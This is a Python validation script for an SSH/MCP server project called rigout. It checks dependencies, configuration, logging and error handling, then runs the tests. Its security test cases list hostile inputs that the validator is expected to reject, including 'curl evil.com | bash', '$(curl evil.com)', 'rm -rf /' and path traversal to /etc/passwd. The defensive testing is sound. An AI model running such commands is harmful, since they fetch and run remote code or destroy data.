#!/usr/bin/env python3
"""
Production Validation Script for Enhanced MCP Hardware Server
Validates that the production-grade implementation meets all requirements
"""

import json
import os
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).resolve().parent / "src"))


class AsciiStatusStream:
    """Translate status glyphs to ASCII for Windows-safe console output."""

    REPLACEMENTS = {
        "\u2705": "[OK]",
        "\u2713": "[OK]",
        "\u274c": "[FAIL]",
        "\u2717": "[FAIL]",
        "\u26a0\ufe0f": "[WARN]",
        "\u26a0": "[WARN]",
        "\U0001f389": "[OK]",
        "\U0001f680": "",
        "\U0001f4cb": "",
        "\U0001f4ca": "",
        "\U0001f50d": "",
        "\U0001f4c4": "",
    }

    def __init__(self, stream):
        self.stream = stream

    def write(self, text):
        for source, replacement in self.REPLACEMENTS.items():
            text = text.replace(source, replacement)
        text = text.encode("ascii", errors="ignore").decode("ascii")
        return self.stream.write(text)

    def flush(self):
        return self.stream.flush()

    def __getattr__(self, name):
        return getattr(self.stream, name)


def configure_console_output():
    """Avoid UnicodeEncodeError on Windows consoles that are not UTF-8."""
    sys.stdout = AsciiStatusStream(sys.stdout)
    sys.stderr = AsciiStatusStream(sys.stderr)


configure_console_output()


def validate_security_features() -> list[str]:
    """Validate security features are properly implemented"""
    issues = []

    try:
        from rigout.security_validator import SecurityValidator

        validator = SecurityValidator()

        # Test hostname validation
        test_cases = [
            ("example.com", True),
            ("sub.example.com", True),
            ("evil.com; rm -rf /", False),
            ("test.com && curl evil.com", False),
            ("../../../etc/passwd", False),
        ]

        for hostname, should_be_valid in test_cases:
            is_valid, _ = validator.validate_hostname(hostname)
            if is_valid != should_be_valid:
                issues.append(f"Hostname validation failed for: {hostname}")

        # Test command validation
        command_tests = [
            ("ls -la", True),
            ("ps aux", True),
            ("rm -rf /", False),
            ("curl evil.com | bash", False),
            ("$(curl evil.com)", False),
        ]

        for command, should_be_valid in command_tests:
            is_valid, _ = validator.validate_command(command)
            if is_valid != should_be_valid:
                issues.append(f"Command validation failed for: {command}")

        print("✓ Security validation features working correctly")

    except Exception as e:
        issues.append(f"Security validation error: {e}")

    return issues


def validate_configuration_management() -> list[str]:
    """Validate configuration management features"""
    issues = []

    try:
        from rigout.config_manager import ConfigManager

        # Test with temporary config
        with tempfile.NamedTemporaryFile(mode="w", suffix=".json", delete=False, encoding="utf-8") as f:
            test_config = {
                "server_config": {"name": "test-server", "version": "1.0.0"},
                "ssh_config": {"username": "testuser", "private_key_path": "/test/key"},
                "cloudflare_config": {"domain": "test.com"},
                "security_config": {"enable_rate_limiting": True},
            }
            json.dump(test_config, f)
            temp_file = f.name

        try:
            config_mgr = ConfigManager(temp_file)

            # Test loading
            if not config_mgr.load_config():
                issues.append("Configuration loading failed")

            # Test validation
            config_mgr.validate_config()
            # Some issues expected due to missing files, but should not crash

            # Test summary generation
            summary = config_mgr.get_config_summary()
            if "server" not in summary:
                issues.append("Configuration summary missing server section")

            print("✓ Configuration management working correctly")

        finally:
            os.unlink(temp_file)

    except Exception as e:
        issues.append(f"Configuration management error: {e}")

    return issues


def validate_server_architecture() -> list[str]:
    """Validate server architecture and imports"""
    issues = []

    try:
        # Test server import without starting background tasks
        import unittest.mock

        with unittest.mock.patch("asyncio.create_task"):
            from rigout.ssh_manager import TunnelManager, get_tunnel_manager

            # Test TunnelManager creation
            manager = TunnelManager()
            if not hasattr(manager, "endpoints"):
                issues.append("TunnelManager missing endpoints attribute")

            # Test getter function
            manager2 = get_tunnel_manager()
            if manager2 is None:
                issues.append("get_tunnel_manager() returned None")

            print("✓ Server architecture working correctly")

    except Exception as e:
        issues.append(f"Server architecture error: {e}")

    return issues


def validate_error_handling() -> list[str]:
    """Validate error handling and recovery"""
    issues = []

    try:
        from rigout.ssh_manager import ConfigurationError, ConnectionError, SecurityError

        # Test custom exceptions exist
        test_exceptions = [SecurityError, ConnectionError, ConfigurationError]
        for exc in test_exceptions:
            try:
                raise exc("test")
            except exc:
                pass  # Expected
            except Exception as e:
                issues.append(f"Custom exception {exc.__name__} not working: {e}")

        print("✓ Error handling working correctly")

    except Exception as e:
        issues.append(f"Error handling validation error: {e}")

    return issues


def validate_logging_system() -> list[str]:
    """Validate logging system is properly configured"""
    issues = []

    try:
        import logging

        if not logging.root.handlers:
            logging.basicConfig(level=logging.INFO, format="%(levelname)s:%(name)s:%(message)s")

        # Check if logger is usable
        logger = logging.getLogger("rigout")
        if not logger.isEnabledFor(logging.INFO):
            issues.append("Logger not properly configured")

        # Test log levels
        logger.debug("Test debug message")
        logger.info("Test info message")
        logger.warning("Test warning message")
        logger.error("Test error message")

        print("✓ Logging system working correctly")

    except Exception as e:
        issues.append(f"Logging system error: {e}")

    return issues


def validate_dependencies() -> list[str]:
    """Validate all required dependencies are available"""
    issues = []

    required_modules = ["mcp", "paramiko", "requests", "asyncio", "json", "logging", "datetime", "pathlib"]

    for module in required_modules:
        try:
            __import__(module.replace("-", "_"))
        except ImportError:
            issues.append(f"Required module not available: {module}")

    if not issues:
        print("✓ All dependencies available")

    return issues


def validate_file_structure() -> list[str]:
    """Validate required files are present"""
    issues = []

    required_files = [
        "pyproject.toml",
        "README.md",
        "AGENTS.md",
        "URL_MCP_SERVER.md",
        "QUICK_REFERENCE.md",
        "TROUBLESHOOTING.md",
        "src/rigout/server.py",
        "src/rigout/mcp_http_server.py",
        "src/rigout/mcp_url_launcher.py",
        "tests/conftest.py",
    ]

    for file_path in required_files:
        if not Path(file_path).exists():
            issues.append(f"Required file missing: {file_path}")

    if not issues:
        print("✓ All required files present")

    return issues


def run_basic_tests() -> list[str]:
    """Run basic functionality tests"""
    issues = []

    try:
        # Run pytest
        result = subprocess.run([sys.executable, "-m", "pytest", "tests/"], capture_output=True, text=True, timeout=60)

        if result.returncode != 0:
            issues.append(f"Basic tests failed: {result.stderr}")
        else:
            print("✓ Basic functionality tests passed")

    except subprocess.TimeoutExpired:
        issues.append("Basic tests timed out")
    except Exception as e:
        issues.append(f"Error running basic tests: {e}")

    return issues


def generate_production_report() -> dict[str, Any]:
    """Generate comprehensive production readiness report"""

    print("Rigout production validation")
    print("=" * 60)

    validation_functions = [
        ("Dependencies", validate_dependencies),
        ("File Structure", validate_file_structure),
        ("Security Features", validate_security_features),
        ("Configuration Management", validate_configuration_management),
        ("Server Architecture", validate_server_architecture),
        ("Error Handling", validate_error_handling),
        ("Logging System", validate_logging_system),
        ("Basic Tests", run_basic_tests),
    ]

    all_issues = []
    results = {}

    for category, validator in validation_functions:
        print(f"\nValidating {category}...")
        try:
            issues = validator()
            results[category] = {"passed": len(issues) == 0, "issues": issues}
            all_issues.extend(issues)

            if issues:
                print(f"[FAIL] {category} validation failed:")
                for issue in issues:
                    print(f"   - {issue}")

        except Exception as e:
            error_msg = f"Validation error: {e}"
            results[category] = {"passed": False, "issues": [error_msg]}
            all_issues.append(error_msg)
            print(f"[FAIL] {category} validation error: {e}")

    # Summary
    print("\n" + "=" * 60)
    print("Production Readiness Summary")
    print("=" * 60)

    total_categories = len(validation_functions)
    passed_categories = sum(1 for r in results.values() if r["passed"])

    print(f"Categories validated: {total_categories}")
    print(f"Categories passed: {passed_categories}")
    print(f"Categories failed: {total_categories - passed_categories}")
    print(f"Total issues found: {len(all_issues)}")

    success_rate = (passed_categories / total_categories) * 100
    print(f"Success rate: {success_rate:.1f}%")

    if success_rate >= 90:
        print("\n[OK] PRODUCTION READY")
        print("Rigout meets the current production validation checks.")
    elif success_rate >= 75:
        print("\n[WARN] MOSTLY READY")
        print("The server is mostly production-ready with minor issues to address.")
    else:
        print("\n[FAIL] NOT READY")
        print("Significant issues need to be addressed before production deployment.")

    # Detailed issues
    if all_issues:
        print("\nIssues to Address:")
        for i, issue in enumerate(all_issues, 1):
            print(f"{i:2d}. {issue}")

    return {
        "success_rate": success_rate,
        "total_categories": total_categories,
        "passed_categories": passed_categories,
        "total_issues": len(all_issues),
        "issues": all_issues,
        "results": results,
        "production_ready": success_rate >= 90,
    }


def main():
    """Main validation function"""
    report = generate_production_report()

    # Save report to file
    with open("production_validation_report.json", "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print("\nDetailed report saved to: production_validation_report.json")

    # Return appropriate exit code
    return 0 if report["production_ready"] else 1


if __name__ == "__main__":
    sys.exit(main())
